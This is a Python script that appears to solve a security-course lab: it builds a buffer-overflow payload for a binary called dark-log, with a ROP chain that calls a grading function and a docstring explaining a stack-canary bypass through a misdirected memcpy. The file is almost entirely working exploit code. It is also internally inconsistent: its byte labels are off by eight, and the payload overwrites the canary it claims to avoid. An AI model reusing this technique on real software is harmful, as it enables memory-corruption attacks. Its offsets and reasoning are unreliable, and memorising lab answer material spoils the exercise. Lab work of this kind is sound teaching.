#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

Stack layout of input() in dark-log:
  expression[128] at rbp-0x120, canary at rbp-0x8, saved rbp, saved rip.
Distance from expression to saved rip = 0x120 + 8 = 296 bytes.
The canary sits at offset 280..288, so a plain overflow would corrupt it.

The lab's intended bypass uses memcpy(f.logMsg + f.len, f.expression, 128).
f.len lives at rbp-0x20 (offset 256 in the gets buffer) and is read AFTER
gets returns, so a value placed at buffer offset 128..132 is copied by
memcpy into f.len itself (logMsg overlaps the second half of expression).
Shifting the memcpy destination by 264 bytes lands it on saved rip,
letting us write the ROP chain without touching the canary.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x4018A3
RET = 0x4018A5
GRADE_EVAL = 0x401677

ROP_CHAIN = (
    p64(RET)
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(GRADE_EVAL)
)

payload = (
    ROP_CHAIN.ljust(128, b"\x90")      # memcpy source -> lands on saved rip
    + struct.pack("<I", 264)           # offset 128..132: becomes f.len via memcpy
    + b"A" * (256 - 132)               # pad through the rest of logMsg
    + b"B" * 24                        # len + pad + canary slot, never read back
    + b"C" * 8                         # saved rbp
    + b"D" * 8                         # saved rip (overwritten by memcpy, not gets)
)

sys.stdout.buffer.write(payload)
